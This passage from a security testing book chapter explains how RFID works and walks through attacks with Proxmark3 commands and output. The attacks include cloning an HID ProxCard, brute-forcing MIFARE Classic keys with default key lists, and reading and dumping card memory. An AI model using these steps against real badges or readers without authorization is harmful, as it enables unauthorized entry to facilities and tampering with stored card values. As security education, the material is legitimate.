<html><head></head><body><div id="sbo-rt-content"><section>
<header>
<h1 class="chapter">
<span class="ChapterNumber"><span epub:type="pagebreak" title="239" id="Page_239"/>10</span><br/>
<span class="ChapterTitle">Short Range Radio: Abusing RFID</span>
</h1>
</header>
<figure class="opener">
<img src="Images/chapterart.png" alt="" width="204" height="204"/>
</figure>
<p class="ChapterIntro">IoT devices don’t always need a continuous wireless transmission across long distances. Manufacturers often use <em>short-range radio</em> technologies to connect devices equipped with cheap, low-powered transmitters. These technologies allow devices to exchange low volumes of data at longer intervals, and as a result, they’re well suited for IoT devices that want to save power when they’re not transmitting any data.</p>
<p>In this chapter, we examine the most popular short-range radio solution, <em>Radio Frequency Identification (RFID)</em>. It’s often used in smart door locks and key card tags for user identification. You’ll learn to clone tags using a variety of methods, break the tags’ cryptographic keys, and change the information stored in the tags. Successfully utilizing these techniques could allow attackers to gain illicit access to a facility, for example. Then you’ll write a simple fuzzer to discover unknown vulnerabilities in RFID readers.</p>
<h2 id="h1-500907c10-0001"><span epub:type="pagebreak" title="240" id="Page_240"/>How RFID Works</h2>
<p class="BodyFirst">RFID was designed to replace barcode technology. It works by transmitting encoded data through radio waves; then it uses this data to identify a tagged entity. This entity might be a human, such as an employee who wants to access a company building; pets; automobiles passing through toll booths; or even simple goods. </p>
<p>RFID systems come in a broad range of shapes, supported ranges, and sizes, but we can usually identify the main components shown in <a id="figureanchor10-1" href="#figure10-1">Figure 10-1</a>.</p>
<figure>
<img src="Images/f10001.png" alt="f10001" width="750" height="386"/>
<figcaption><p><a id="figure10-1">Figure 10-1:</a> Common RFID system components</p></figcaption>
</figure>
<p>The RFID tag’s memory contains information that identifies an entity. The reader can read the tag’s information using a scanning antenna, which is usually externally connected and typically generates the constant electromagnetic field required for this wireless connection. When the tag’s antenna is within range of the reader’s, the reader’s electromagnetic field sends an electric current to power up the RFID tag. The tag can then receive commands from the RFID reader and send responses containing the identification data. </p>
<p>Several organizations have created standards and regulations that dictate the radio frequency, protocols, and procedures used to share information using RFID technologies. The following sections provide an overview of these variations, the security principles on which they’re based, and a testing methodology for RFID-enabled IoT devices.  </p>
<h3 id="h2-500907c10-0001">Radio Frequency Bands</h3>
<p class="BodyFirst">RFID relies on a group of technologies that operate in specific radio frequency bands, as listed in <a href="#table10-1" id="tableanchor10-1">Table 10-1</a>. </p>
<figure>
<figcaption class="TableTitle"><p><a id="table10-1">Table 10-1</a>: RFID Bands</p></figcaption>
<table id="table-500907c10-0001" border="1">
<thead>
<tr>
<td><b>Frequency band</b></td><td><b>Signal range </b></td></tr>
</thead>
<tbody>
<tr>
<td>Very low frequency (VLF)</td><td>(3 kHz–30 kHz)</td></tr>
<tr>
<td>Low frequency (LF)</td><td>(30 kHz–300 kHz)</td></tr>
<tr>
<td>Medium frequency (MF)</td><td>(300 kHz–3,000 kHz)</td></tr>
<tr>
<td><span epub:type="pagebreak" title="241" id="Page_241"/>High frequency (HF)</td><td>(3,000 kHz–30 MHz)</td></tr>
<tr>
<td>Very high frequency (VHF)</td><td>(30 MHz–300 MHz)</td></tr>
<tr>
<td>Ultra high frequency (UHF)</td><td>(300 MHz–3,000 MHz)</td></tr>
<tr>
<td>Super high frequency (SHF)</td><td>(3,000 MHz–30 GHz)</td></tr>
<tr>
<td>Extremely high frequency (EHF)</td><td>(30 GHz–300 GHz)</td></tr>
<tr>
<td>Uncategorized </td><td>(300 GHz–3,000 GHz)</td></tr>
</tbody>
</table>
</figure>
<p>Each of these RFID technologies follows a specific protocol. The best technology to use for a system depends on factors such as the signal’s range, data transfer rate, accuracy, and implementation cost.</p>
<h3 id="h2-500907c10-0002">Passive and Active RFID Technologies</h3>
<p class="BodyFirst">An RFID tag can rely on its own power source, such as an embedded battery, or receive its power from the reading antenna using the current induced from the received radio waves. We characterize these as <em>active</em> or <em>passive</em> technologies, as shown in <a id="figureanchor10-2" href="#figure10-2">Figure 10-2</a>.  </p>
<figure>
<img src="Images/f10002.png" alt="f10002" width="750" height="422"/>
<figcaption><p><a id="figure10-2">Figure 10-2:</a> Passive and active technologies along the radio frequency spectrum</p></figcaption>
</figure>
<p>Because active devices don’t need external power to start a communication process, they operate on higher frequencies and can continuously broadcast their signal. They can also support connections over longer ranges, so they’re often used as tracking beacons. Passive devices operate on the three lower frequencies of the RFID spectrum. </p>
<p><span epub:type="pagebreak" title="242" id="Page_242"/>Some special devices are <em>semi-passive</em>; they contain integrated power sources capable of powering the RFID tag microchip at all times without requiring power from the reader’s signal. For this reason, the devices respond faster and in a greater reading range than passive ones. </p>
<p>Another way to identify the differences between the existing RFID technologies is to look at their radio waves. Low-frequency devices use long-range waves, whereas high-frequency devices use short-range waves (<a id="figureanchor10-3" href="#figure10-3">Figure 10-3</a>). </p>
<figure>
<img src="Images/f10003.png" alt="f10003" width="750" height="566"/>
<figcaption><p><a id="figure10-3">Figure 10-3:</a> Wave forms depending on the frequency</p></figcaption>
</figure>
<p>These RFID implementations also use antennas with very different dimensions and wire turns, as shown in <a href="#table10-2" id="tableanchor10-2">Table 10-2</a>. The shape of each antenna provides the best range and data transfer rate for each wavelength used.</p>
<h3 id="h2-500907c10-0003">The Structure of RFID Tags</h3>
<p class="BodyFirst">To understand existing cybersecurity threats in RFID tags, you need to understand the inner workings of these devices. Commercial tags usually comply with the ISO/IEC 18000 and EPCglobal international standards, which define a series of diverse RFID technologies, each using a unique frequency range. </p>
<figure>
<figcaption class="TableTitle"><p><a id="table10-2">Table 10-2</a>: Antennas for Different Frequency Implementations<span epub:type="pagebreak" title="243" id="Page_243"/></p></figcaption>
<table id="table-500907c10-0002" border="1">
<thead>
<tr>
<td><b>Low frequency</b></td><td><b>High frequency</b></td><td><b>Ultra high frequency</b></td></tr>
</thead>
<tbody>
<tr>
<td><figure class="graphic">
<img src="Images/g10001.png" alt="g10001" width="462" height="465"/>
</figure>
</td><td><figure class="graphic">
<img src="Images/g10002.png" alt="g10002" width="588" height="750"/>
</figure>
</td><td><figure class="graphic">
<img src="Images/g10003.png" alt="g10003" width="750" height="727"/>
</figure>
</td></tr>
</tbody>
</table>
</figure>
<h4 id="h3-500907c10-0001">Tag Classes</h4>
<p class="BodyFirst">EPCglobal divides RFID tags into six categories. A tag in each category has all the capabilities listed in the previous category, making it backward compatible. </p>
<p><em>Class 0 tags</em> are passive tags that operate in UHF bands. The vendor preprograms them at the production factory. As a result, you can’t change the information stored in their memory. </p>
<p><em>Class 1 tags</em> can also operate in HF bands. In addition, they can be written only once after production. Many Class 1 tags can also process <em>cyclic redundancy checks (CRCs)</em> of the commands they receive. CRCs are a few extra bytes at the end of the commands for error detection. </p>
<p><em>Class 2 tags</em> can be written multiple times. </p>
<p><em>Class 3 tags</em> can contain embedded sensors that can record environmental parameters, such as the current temperature or the tag’s motion. These tags are semi-passive, because although they have an embedded power source, such as an integrated battery, they can’t initiate wireless communication with other tags or readers. </p>
<p>On the contrary, <em>Class 4 tags</em> can initiate communication with other tags of the same class, making them active tags. </p>
<p>The most advanced tags are the <em>Class 5 tags</em>, which can provide power to other tags and communicate with all the previous tag classes. Class 5 tags can act as RFID readers.</p>
<h4 id="h3-500907c10-0002">Information Stored in RFID Tags</h4>
<p class="BodyFirst">An RFID tag’s memory usually stores four kinds of data: (a) the <em>identification data</em>, which identifies the entity to which the tag is attached; (b) the <em>supplementary data,</em> which provides further details regarding the entity; (c) the <em>control data</em>, used for the tag’s internal configuration; and (d) the tag’s <em><span epub:type="pagebreak" title="244" id="Page_244"/>manufacturer data</em>, which contains a tag’s <em>Unique Identifier (UID)</em> and details regarding the tag’s production, type, and vendor. You’ll find the first two kinds of data in all the commercial tags; the last two can differ based on the tag’s vendor. </p>
<p>The identification data includes user-defined fields, such as bank accounts, product barcodes, and prices. It also includes a number of registers specified by the standards to which the tags adhere. For example, the ISO standard specifies the <em>Application Family Identifier (AFI)</em> value, a code that indicates the kind of object the tag belongs to. A tag for traveling baggage would use a different predefined AFI than a tag for a library book. Another important register, also specified by ISO, is the<em> Data Storage Format Identifier</em><em>(DSFID)</em>, which defines the logical organization of the user data. </p>
<p>The supplementary data can handle other details defined by the standards, such as Application Identifiers (AIs), ANSI MH-10 Data Identifiers (DIs), and ATA Text Element Identifiers (TEIs), which we won’t discuss here.</p>
<p>RFID tags also support different kinds of security controls, depending on the tag vendor. Most have mechanisms that restrict the read or write operations on each user memory block and on the special registers containing the AFI and DSFID values. These lock mechanisms use data stored in the control memory and have default passwords preconfigured by the vendor but allow the tag owners to configure custom passwords.</p>
<h3 id="h2-500907c10-0004">Low-Frequency RFID Tags</h3>
<p class="BodyFirst">Low-frequency RFID devices include key cards that employees use to open doors, small glass tube tags implanted into pets, and temperature-resistant RFID tags for laundry, industrial, and logistics applications. These devices rely on passive RFID technology and operate in a range of 30 kHz to 300 kHz, although most of the devices that people use daily to track, access, or validate a task operate in the narrower range of 125 kHz to 134 kHz. The low-frequency tags have low memory capacities, a slow data transfer rate, and water and dust resistance, unlike the high frequency technologies.</p>
<p>Often, we use low-frequency tags for access control purposes. The reason is that their low memory capacity can handle only small amounts of data, such as IDs used to authenticate. One of the most sophisticated tags, HID Global’s ProxCard (<a id="figureanchor10-4" href="#figure10-4">Figure 10-4</a>), uses a small number of bytes to support unique IDs that a tag management system can use for user authentication. </p>
<figure>
<img src="Images/f10004.png" alt="f10004" width="244" height="380"/>
<figcaption><p><a id="figure10-4">Figure 10-4:</a> The HID ProxCard II, a popular low-frequency RFID tag</p></figcaption>
</figure>
<p><span epub:type="pagebreak" title="245" id="Page_245"/>Other companies, such as NXP with its Hitag2 tags and readers, introduced further security controls; for example, a mutual authentication protocol that uses a shared key to protect communications between the tag and reader. This technology is very popular in vehicle immobilization applications.</p>
<h3 id="h2-500907c10-0005">High-Frequency RFID Tags</h3>
<p class="BodyFirst">You can find high-frequency RFID implemented globally in applications like payment systems, making it a game changer in the contactless world. Many people refer to this technology as <em>Near Field Communication (NFC)</em>, a term for devices operating over the 13.56 MHz frequency. Some of the most important NFC technologies are the MIFARE cards and the NFC microcontrollers integrated into mobile devices. </p>
<p>One of the most popular high-frequency tag vendors is NXP, which controls approximately 85 percent of the contactless market. Mobile devices use many of its NFC chips. For example, the new versions of the iPhone XS and XS Max implement the NXP 100VB27 controller. This allows the iPhones to communicate with other NFC transponders and perform tasks such as contactless payments. Additionally, NXP has some low-cost and well-documented microcontrollers, such as the PN532, used for research and development purposes. The PN532 supports reading and writing, peer-to-peer communication, and emulation modes. </p>
<p>NXP also designs the MIFARE cards, which are contactless smart cards based on ISO/IEC 14443. The MIFARE brand has different families, such as MIFARE Classic, MIFARE Plus, MIFARE Ultralight, MIFARE DESFire, and MIFARE SAM. According to NXP, these cards implement AES and DES/Triple-DES encryption methods, whereas some versions, such as MIFARE Classic, MIFARE SAM, and MIFARE Plus, also support its proprietary encryption algorithm Crypto-1.</p>
<h2 id="h1-500907c10-0002">Attacking RFID Systems with Proxmark3</h2>
<p class="BodyFirst">In this section, we’ll walk through a number of attacks against RFID tags. We’ll clone the tags, allowing you to impersonate a legitimate person or object. We’ll also circumvent the cards’ protections to tamper with their stored memory contents. In addition, we’ll build a simple fuzzer that you can use against devices with RFID reading capabilities. </p>
<p>As a card reader, we’ll use Proxmark3, a general-purpose RFID tool with a powerful field-programmable gate array (FPGA) microcontroller capable of reading and emulating low-frequency and high-frequency tags (<a href="https://github.com/Proxmark/proxmark3/wiki">https://github.com/Proxmark/proxmark3/wiki</a>). Proxmark3 currently costs less than $300. You can also use the Proxmark3 EVO and Proxmark3 RDV 4 versions of the tool. To read tags with Proxmark3, you’ll need antennas designed for the frequency band of the specific card you’re reading (reference <a href="#table10-2">Table 10-2</a> for images of the antenna types). You can obtain these antennas from the same distributors that offer the Proxmark3 device. </p>
<p>We’ll also show you how to use free apps to transform any NFC-enabled Android device into a card reader for MIFARE cards. </p>
<p><span epub:type="pagebreak" title="246" id="Page_246"/>To perform these tests, we’ll use an HID ProxCard, as well as a number of unprogrammed T55x7 tags and NXP MIFARE Classic 1KB cards, which cost less than $2 each.</p>
<h3 id="h2-500907c10-0006">Setting Up Proxmark3</h3>
<p class="BodyFirst">To use Proxmark3, you’ll first have to install a number of required packages on your computer. Here’s how to do so using <code>apt</code> :</p>
<pre><code>$ <b>sudo apt install git build-essential libreadline5 libreadline-dev gcc-arm-none-eabi libusb-0.1-4 libusb-dev libqt4-dev ncurses-dev perl pkg-config libpcsclite-dev pcscd</b></code></pre>
<p>Next, use the <code>git</code> command to download the source code from the Proxmark3 remote repository. Then navigate to its folder and run the <code>make</code> command to build the required binaries:</p>
<pre><code>$ <b>git clone <a href="https://github.com/Proxmark/proxmark3.git">https://github.com/Proxmark/proxmark3.git</a></b>
$ <b>cd proxmark3</b>
$ <b>make clean &amp;&amp; make all</b></code></pre>
<p>Now you’re ready to plug the Proxmark3 into your computer using a USB cable. Once you’ve done so, identify the serial port to which the device is connected using the <code>dmesg</code> command, available in Kali Linux. You can use this command to get information about the hardware on a system:</p>
<pre><code>$ <b>dmesg</b>
[44643.237094] usb 1-2.2: new full-speed USB device number 5 using uhci_hcd
[44643.355736] usb 1-2.2: New USB device found, idVendor=9ac4, idProduct=4b8f, bcdDevice= 0.01
[44643.355738] usb 1-2.2: New USB device strings: Mfr=1, Product=2, SerialNumber=0
[44643.355739] usb 1-2.2: Product: proxmark3
[44643.355740] usb 1-2.2: Manufacturer: proxmark.org
[44643.428687] cdc_acm 1-2.2:1.0: ttyACM0: USB ACM device</code></pre>
<p>Based on the output, we know the device is connected on the <em>/dev/ttyACM0</em> serial port.</p>
<h3 id="h2-500907c10-0007">Updating Proxmark3</h3>
<p class="BodyFirst">Because Proxmark3’s source code changes frequently, we recommend that you update the device before using it. The device software consists of the operating system, the bootloader image, and the FPGA image. The bootloader executes the operating system, whereas the FPGA image is the code that executes in the device’s embedded FPGA.</p>
<p>The latest bootloader version is in the <em>bootrom.elf</em> file in the source code folders. To install it, hold down the Proxmark3’s button while the device is connected to your computer until you see a red and yellow light on the device. Then, while holding the button, use the <em>flasher </em>binary in the source <span epub:type="pagebreak" title="247" id="Page_247"/>code folder to install the image. As parameters, pass it Proxmark3’s serial interface and the <code>-b</code><em> </em>parameter to define the bootloader’s image path:</p>
<pre><code>$<b> ./client/flasher /dev/ttyACM0 -b ./bootrom/obj/bootrom.elf</b>
Loading ELF file '../bootrom/obj/bootrom.elf'...
Loading usable ELF segments:
0: V 0x00100000 P 0x00100000 (0x00000200-&gt;0x00000200) [R X] @0x94
1: V 0x00200000 P 0x00100200 (0x00000c84-&gt;0x00000c84) [R X] @0x298
Waiting for Proxmark to appear on /dev/ttyACM0 .
Found.
Flashing...
Writing segments for file: ../bootrom/obj/bootrom.elf
0x00100000..0x001001ff [0x200 / 1 blocks]. OK
0x00100200..0x00100e83 [0xc84 / 7 blocks]....... OK
Resetting hardware...
All done.
Have a nice day!</code></pre>
<p>You can find the latest versions of the operating system and FPGA image in the same file, named <em>fullimage.elf</em>, in the source code folders. If you’re using Kali Linux, you should also stop and disable the ModemManager. The ModemManager is the daemon that controls mobile broadband devices and connections in many Linux distributions; it can interfere with connected devices, such as Proxmark3. To stop and disable this service, use the <code>systemectl</code><em> </em>command, which is preinstalled in Kali Linux:</p>
<pre><code># <b>systemctl stop ModemManager</b>
# <b>systemctl disable ModemManager</b></code></pre>
<p>You can use the Flasher tool to complete the flash again, this time without the <code>-b</code><em> </em>parameter.</p>
<pre><code>#<b> </b><b>./</b><b>client/flasher /dev/ttyACM0 armsrc/obj/fullimage.elf</b>
Loading ELF file 'armsrc/obj/fullimage.elf'...
Loading usable ELF segments:
0: V 0x00102000 P 0x00102000 (0x0002ef48-&gt;0x0002ef48) [R X] @0x94
1: V 0x00200000 P 0x00130f48 (0x00001908-&gt;0x00001908) [RW ] @0x2efdc
Note: Extending previous segment from 0x2ef48 to 0x30850 bytes
Waiting for Proxmark to appear on /dev/ttyACM0 .
Found.
Flashing...
Writing segments for file: armsrc/obj/fullimage.elf
0x00102000..0x0013284f [0x30850 / 389 blocks]......... OK
Resetting hardware...
All done.
Have a nice day!</code></pre>
<p>The Proxmark3 RVD 4.0 also supports a command to automate the full process of updating the bootloader, the operating system, and the FPGA:</p>
<pre><code>$ ./<b>pm3-flash-all</b></code></pre>
<p><span epub:type="pagebreak" title="248" id="Page_248"/>To find out if the update succeeded, execute the <code>Proxmark3</code> binary, which is located in the <em>client</em> folder, and pass it the device’s serial interface: </p>
<pre><code># <b>./client/proxmark3 /dev/ttyACM0</b>
Prox/RFID mark3 RFID instrument          
bootrom: master/v3.1.0-150-gb41be3c-suspect 2019-10-29 14:22:59
os: master/v3.1.0-150-gb41be3c-suspect 2019-10-29 14:23:00
fpga_lf.bit built for 2s30vq100 on 2015/03/06 at 07:38:04
fpga_hf.bit built for 2s30vq100 on 2019/10/06 at 16:19:20
SmartCard Slot: not available
uC: AT91SAM7S512 Rev B          
Embedded Processor: ARM7TDMI          
Nonvolatile Program Memory Size: 512K bytes. Used: 206927 bytes (39%). Free: 317361 bytes (61%).          
Second Nonvolatile Program Memory Size: None          
Internal SRAM Size: 64K bytes          
Architecture Identifier: AT91SAM7Sxx Series          
Nonvolatile Program Memory Type: Embedded Flash Memory          
proxmark3&gt;</code></pre>
<p>The command should output the device’s attributes, such as the embedded processor type, the memory size, and the architecture identifier, followed by the prompt.</p>
<h3 id="h2-500907c10-0008">Identifying Low- and High-Frequency Cards</h3>
<p class="BodyFirst">Now let’s identify specific kinds of RFID cards. The Proxmark3 software comes with a preloaded list of known RFID tags for different vendors, and it supports vendor-specific commands that you can use to control these tags. </p>
<p>Before using the Proxmark3, connect it to an antenna that matches the card type. If you’re using the newer Proxmark3 RVD 4.0 model, the antennas will look slightly different because they’re more compact. Consult the vendor’s documentation to select the right one for each case.</p>
<p>Proxmark3 commands all begin with either the <code>lf</code> parameter, for interacting with the low-frequency cards, or the <code>hf</code> parameter, for interacting with the high-frequency cards. To identify nearby known tags, use the <code>search </code>parameter. In the following example, we use Proxmark3 to identify a Hitag2 low-frequency tag:</p>
<pre><code>proxmark3&gt;<b> lf search </b>
Checking for known tags: 
Valid Hitag2 tag found - UID: 01080100   </code></pre>
<p>The next command identifies an NXP ICode SLIX high-frequency tag:</p>
<pre><code>proxmark3&gt; <b>hf search    </b>
UID:               E0040150686F4CD5          
Manufacturer byte: 04, NXP Semiconductors Germany          
Chip ID:           01, IC SL2 ICS20/ICS21(SLI) ICS2002/ICS2102(SLIX)          
Valid ISO15693 Tag Found - Quiting Search</code></pre>
<p><span epub:type="pagebreak" title="249" id="Page_249"/>Depending on the tag vendor, the command’s output might also include the manufacturer, microchip identification number, or known tag-specific vulnerabilities.</p>
<h3 id="h2-500907c10-0009">Low-Frequency Tag Cloning</h3>
<p class="BodyFirst">Let’s clone a tag, starting with a low-frequency one. The low-frequency cards available on the market include HID ProxCard, Cotag, Awid, Indala, and Hitag, among others, but HID ProxCards are the most common. In this section, we’ll clone it using Proxmark3 and then create a new tag containing the same data. You could use this tag to impersonate the legitimate tagged entity, such as an employee, and unlock the corporate building’s smart door lock.</p>
<p>To start, use the low-frequency search command to identify cards that are in Proxmark3’s range. If the card in range is an HID, the output will typically look like this: </p>
<pre><code>proxmark3&gt; <b>lf search</b>
Checking for known tags:
HID Prox TAG ID: 2004246b3a (13725) - Format Len: 26bit - FC: 18 - Card: 13725          
[+] Valid HID Prox ID Found!</code></pre>
<p>Next, examine the supported vendor-specific tag commands for HID devices by providing <code>hid</code> as a parameter:</p>
<pre><code>proxmark3&gt; <b>lf hid</b>
help            this help          
demod        demodulate HID Prox tag from the GraphBuffer          
read            attempt to read and extract tag data          
clone          clone HID to T55x7          
sim             simulate HID tag         
wiegand     convert facility code/card number to Wiegand code          
brute          bruteforce card number against reader          </code></pre>
<p>Now try to read the tag data:</p>
<pre><code>proxmark3&gt; <b>lf hid read</b>
HID Prox TAG ID: 2004246b3a (13725) - Format Len: 26bit - FC: 18 - Card: 13725</code></pre>
<p>The command should return the HID tag’s exact ID. </p>
<p>To clone this tag with the Proxmark3, use a blank or previously unprogrammed T55x7 card. These cards are normally compatible with EM4100, HID, and Indala technologies. Position the T55x7 card over the low-frequency antenna and execute the following command, passing it the ID of the tag you want to clone:</p>
<pre><code>proxmark3&gt; <b>lf hid clone 2004246b3a</b>
Cloning tag with ID 2004246b3a    </code></pre>
<p>Now you could use the T55x7 card as though it were the original card.</p>
<h3 id="h2-500907c10-0010"><span epub:type="pagebreak" title="250" id="Page_250"/>High-Frequency Tag Cloning</h3>
<p class="BodyFirst">Although high-frequency technologies implement better security than low-frequency ones, inadequate or old implementations could be vulnerable to attacks. For example, the MIFARE Classic cards are among the most vulnerable high-frequency cards, because they use default keys and an insecure proprietary cryptographic mechanism. In this section, we’ll walk through the process of cloning a MIFARE Classic card.</p>
<h4 id="h3-500907c10-0003">MIFARE Classic Memory Allocation </h4>
<p class="BodyFirst">To understand what MIFARE Classic’s possible attack vectors are, let’s analyze the memory allocation in the simplest MIFARE card: the MIFARE Classic 1KB (<a id="figureanchor10-5" href="#figure10-5">Figure 10-5</a>).</p>
<figure>
<img src="Images/f10005.png" alt="f10005" width="742" height="750"/>
<figcaption><p><a id="figure10-5">Figure 10-5:</a> MIFARE Classic memory map </p></figcaption>
</figure>
<p>The MIFARE Classic 1KB card has 16 sectors. Each sector occupies four blocks, and each block contains 16 bytes. The manufacturer saves the card’s UID in Sector 0 of Block 0, which you can’t alter. </p>
<p>To access each sector, you’ll need two keys, A and B. The keys can be different, but many implementations use default keys (<code>FFFFFFFFFFFF</code> is a common one). These keys get stored in Block 3 of each sector, called the <em>sector trailer</em>. <span epub:type="pagebreak" title="251" id="Page_251"/>The sector trailer also stores the <em>access bits</em>, which establish the read and write permissions on each block using the two keys. </p>
<p>To understand why having two keys is useful, let’s consider an example: the cards we use to ride a subway system. These cards might allow an RFID reader to readall data blocks with either key A or B but write to them only with key B. As a result, the RFID reader at the turnstile, which has only key A, can read the card’s data, unlock the turnstile for users with sufficient balance, and decrement their balance. But you’d need a special terminal equipped with key B to write, or increment, the users’ balance. The station cashier might be the only person who can operate this terminal.</p>
<p>The access bits are located between the two key types. If a company misconfigures these bits—for example, by unintentionally granting write permissions—adversaries could tamper with the sector’s block data. <a href="#table10-3" id="tableanchor10-3">Table 10-3</a> lists the possible access control permissions that you could define using these access bits.</p>
<figure>
<figcaption class="TableTitle"><p><a id="table10-3">Table 10-3</a>: MIFARE Access Bits</p></figcaption>
<table id="table-500907c10-0003" border="1">
<thead>
<tr>
<td><b>Access bits</b></td><td><b>Valid access control permissions</b></td><td><b>Block</b></td><td><b>Description</b></td></tr>
</thead>
<tbody>
<tr>
<td>C1<sub>3,</sub> C2<sub>3,</sub> C3<sub>3,</sub></td><td>Read, write</td><td>3</td><td>Sector trailer</td></tr>
<tr>
<td>C1<sub>2,</sub> C2<sub>2,</sub> C3<sub>2</sub></td><td>Read, write, increment, decrement, transfer, restore</td><td>2</td><td>Data block</td></tr>
<tr>
<td>C1<sub>1,</sub> C2<sub>1,</sub> C3<sub>1</sub></td><td>Read, write, increment, decrement, transfer, restore</td><td>1</td><td>Data block</td></tr>
<tr>
<td>C1<sub>0,</sub> C2<sub>0,</sub> C3<sub>0,</sub></td><td>Read, write, increment, decrement, transfer, restore</td><td>0</td><td>Data block</td></tr>
</tbody>
</table>
</figure>
<p>You could use various methods to exploit the MIFARE Classic cards. You might use special hardware, such as the Proxmark3 or an Arduino with a PN532 board. Even less sophisticated hardware, as simple as an Android phone, might be enough to copy, clone, and replay a MIFARE Classic card, but many hardware researchers prefer the Proxmark3 to other solutions because of its preloaded commands. </p>
<p>To view the attacks you could perform against the MIFARE Classic card, use the <code>hf mf</code><em> </em>command: </p>
<pre><code>proxmark3&gt; <b>hf mf</b>
help                This help          
darkside         Darkside attack. read parity error messages.          
nested             Nested attack. Test nested authentication          
hardnested     Nested attack for hardened MIFARE cards          
keybrute         J_Run's 2nd phase of multiple sector nested authentication key recovery          
nack               Test for MIFARE NACK bug          
chk                 Check keys          
fchk                Check keys fast, targets all keys on card          
decrypt           [nt] [ar_enc] [at_enc] [data] - to decrypt snoop or trace          
-----------                
dbg                 Set default debug mode   
…</code></pre>
<p><span epub:type="pagebreak" title="252" id="Page_252"/>Most of the listed commands implement brute-force attacks against the authentication protocol used (such as the <code>chk </code>and<code> fchk </code>commands) or attacks for known vulnerabilities (such as the <code>nack</code>, <code>darkside</code>, and <code>hardnested</code> commands). We’ll use the <code>darkside</code> command in Chapter 15.</p>
<h4 id="h3-500907c10-0004">Cracking the Keys with a Brute-Force Attack </h4>
<p class="BodyFirst">To read the MIFARE card’s memory blocks, you need to find the keys for each of the 16 sectors. The simplest way to do this is to perform a brute-force attack and attempt to authenticate using a list of default keys. Proxmark3 has a special command for this attack, called <code>chk</code> (an abbreviation of the word check). This command uses a list of known passwords to try to read the card. </p>
<p>To perform this attack, first select the commands in the high-frequency band using the <code>hf</code> parameter, followed by the <code>mf</code> parameter, which will show you the commands for MIFARE cards. Then add the <code>chk</code> parameter to select the brute-force attack. You must also provide the number of blocks that you’re targeting. This can be a parameter between <code>0x00</code> and <code>0xFF</code>, or it can be the <em>*</em> character, which selects all the blocks, followed by a number that specifies the tag’s memory size (<code>0</code> = 320 bytes, <code>1</code> = 1KB, <code>2</code> = 2KB, and <code>4</code> = 4KB). </p>
<p>Next, provide the key type: <code>A</code> for type A keys, <code>B</code> for type B keys, and <code>?</code> for testing both types of keys. You can also use the <code>d</code> parameter to write the identified keys to a binary file or the <code>t</code> parameter to load the identified keys directly to the Proxmark3 emulator memory for further use, such as reading specific blocks or sectors. </p>
<p>Then you can specify either a space-separated list of keys or a file that contains these keys. Proxmark3 contains a default list in the source code folder at <em>./client/default_keys.dic</em>. If you don’t provide your own list or a file with the keys, Proxmark3 will use this file to test the 17 most common default keys.</p>
<p>Here is an example run of the brute-force attack:</p>
<pre><code>$ proxmark3&gt; <b>hf mf chk *1 ? </b><b>t</b><b> </b><b>./client/</b><b>default_keys.dic</b>
--chk keys. sectors:16, block no:  0, key type:B, eml:n, dmp=y checktimeout=471 us          
chk custom key[ 0] FFFFFFFFFFFF          
chk custom key[ 1] 000000000000          
…          
chk custom key[91] a9f953def0a3          
To cancel this operation press the button on the proxmark...          
--o.          
|---|----------------|---|----------------|---|          
|sec|key A           |res|key B           |res|          
|---|----------------|---|----------------|---|          
|000|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          
|001|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          
|002|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          
|003|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |           
…
|014|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          
|015|  FFFFFFFFFFFF  | 1 |  FFFFFFFFFFFF  | 1 |          
|---|----------------|---|----------------|---|          
32 keys(s) found have been transferred to the emulator memory          </code></pre>
<p><span epub:type="pagebreak" title="253" id="Page_253"/>If the command succeeds, it displays a table with the A and B keys for the 16 sectors. If you used the <code>b</code> parameter, Proxmark3 stores the keys in a file named <em>dumpedkeys.bin , </em>and the output would look like this:</p>
<pre><code>Found keys have been dumped to file dumpkeys.bin. </code></pre>
<p>The latest versions of Proxmark3, such as RVD 4.0, support an optimized version of the same command, called <code>fchk</code>. It takes two parameters, the tag’s memory size and the <code>t</code> (transfer) parameter, which you can use to load the keys to the Proxmark3 memory:</p>
<pre><code>proxmark3&gt; hf mf fchk 1 t
[+] No key specified, trying default keys          
[ 0] FFFFFFFFFFFF          
[ 1] 000000000000          
[ 2] a0a1a2a3a4a5          
[ 3] b0b1b2b3b4b5          
…</code></pre>
<h4 id="h3-500907c10-0005">Reading and Cloning the Card Data</h4>
<p class="BodyFirst">Once you know the keys, you can start reading sectors or blocks using the <code>rdbl</code> parameter. The following command reads block number 0 with the A key <code>FFFFFFFFFFFF</code>: </p>
<pre><code>proxmark3&gt; <b>hf mf rdbl 0 A FFFFFFFFFFFF</b>
--block no:0, key type:A, key:FF FF FF FF FF FF            
data: B4 6F 6F 79 CD 08 04 00 01 2A 51 62 0B D9 BB 1D           </code></pre>
<p>You can read a complete sector, using the same methodology, with the <code>hf mf rdsc</code><em> </em>command:</p>
<pre><code>proxmark3&gt; <b>hf mf rdsc 0 A FFFFFFFFFFFF</b>
--sector no:0 key type:A key:FF FF FF FF FF FF            
isOk:01          
data   : B4 6F 6F 79 CD 08 04 00 01 2A 51 62 0B D9 BB 1D           
data   : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
data   : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00           
trailer: 00 00 00 00 00 00 FF 07 80 69 FF FF FF FF FF FF           
Trailer decoded:          
Access block 0: rdAB wrAB incAB dectrAB          
Access block 1: rdAB wrAB incAB dectrAB          
Access block 2: rdAB wrAB incAB dectrAB          
Access block 3: wrAbyA rdCbyA wrCbyA rdBbyA wrBbyA          
UserData: 69 </code></pre>
<p>To clone a MIFARE card, use the <code>dump</code><em> </em>parameter. This parameter writes a file with all the information from the original card. You could save and reuse that file later to create a new, fresh copy of the original card.</p>
<p>The <code>dump</code> parameter lets you assign the name of a file or the type of technology that you want to dump. Just pass it the card’s memory size. In <span epub:type="pagebreak" title="254" id="Page_254"/>this example, we use <code>1</code> for the 1KB memory size (although because <code>1</code> is the default size, we could have omitted this). The command uses the keys we stored in the <em>dumpkeys.bin</em> file to access the card:</p>
<pre><code>proxmark3&gt; <b>hf mf dump</b><b> 1</b>
[=] Reading sector access bits...          
...
[+] Finished reading sector access bits          
[=] Dumping all blocks from card...          
[+] successfully read block  0 of sector  0.          
